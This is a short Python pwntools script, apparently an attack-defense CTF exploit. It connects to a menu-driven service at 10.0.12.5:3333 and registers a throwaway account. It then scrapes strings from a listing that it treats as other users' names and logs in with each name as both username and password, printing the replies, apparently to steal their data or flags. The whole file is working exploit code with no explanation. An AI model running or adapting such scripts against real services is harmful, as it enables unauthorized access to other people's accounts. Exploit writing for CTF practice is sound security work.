#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os,re
os.environ['PWNLIB_NOTERM'] = 'True'
from pwn import *

#ip = sys.argv[1]
ip = '10.0.12.5'
port = 3333

def generator(size=12, chars=string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

username = generator()
password = username


r = remote(ip, port)
r.recvrepeat(timeout=1).decode()
r.send('1\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send('1\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send(username.encode() + '\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send(username.encode() + '\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send('2\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send('2\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send(username.encode() + '\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send(username.encode() + '\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send('2\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send('4\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send('2\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send('3\n'.encode())
users = re.findall('\w{15,40}',str(r.recvrepeat(timeout=3).decode().split('\n')))
print(users)
r.send('4\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send('4\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send('1\n'.encode())
r.recvrepeat(timeout=1).decode()
r.send('3\n'.encode())
r.recvrepeat(timeout=1).decode()
for user in users:
    r.send(str(user).encode() + '\n'.encode())
    print(r.recvrepeat(timeout=1).decode())
    r.send(str(user).encode() + '\n'.encode())
    r.recvrepeat(timeout=1).decode()
    r.send(str(user).encode() + '\n'.encode())
    print(r.recvrepeat(timeout=1).decode())
    r.send('2\n'.encode())
    r.recvrepeat(timeout=1).decode()
    r.recvrepeat(timeout=1).decode()
    r.send('2\n'.encode())
    r.send(str(user).encode() + '\n'.encode())
    r.recvrepeat(timeout=1).decode()
    r.send(str(user).encode() + '\n'.encode())
    print(r.recvrepeat(timeout=1).decode())
    break
r.close()
